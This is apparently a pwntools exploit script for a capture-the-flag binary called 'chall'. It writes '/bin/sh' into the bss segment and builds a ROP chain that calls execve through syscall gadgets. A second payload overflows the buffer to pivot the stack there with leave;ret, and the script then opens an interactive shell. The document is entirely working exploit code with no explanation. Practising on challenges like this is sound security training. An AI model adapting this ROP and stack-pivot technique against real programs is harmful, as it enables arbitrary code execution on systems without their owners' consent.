from pwn import *

context.terminal = "cmd.exe /c wt.exe -- wsl.exe -d Ubuntu -- ".split()

elf = ELF("./chall")
context.arch = "amd64"
context.log_level = "debug"
p = process("./chall")
#p = gdb.debug("./chall", gdbscript="b *0x4012a9\ncontinue")

bss = 0x4040a0
pop_rax = 0x401231
pop_rdi = 0x401233
pop_rsi = 0x401235
pop_rdx = 0x401237
syscall = 0x401239
leave_ret = 0x4012a8

payload = flat([
    "/bin/sh\x00",
    pop_rax, 59,
    pop_rdi, bss,
    pop_rsi, 0,
    pop_rdx, 0,
    syscall
    ])

p.sendlineafter(">", payload)

pivot = b"A"*0x20+p64(bss)+p64(leave_ret)

p.sendlineafter(">", pivot)

p.interactive()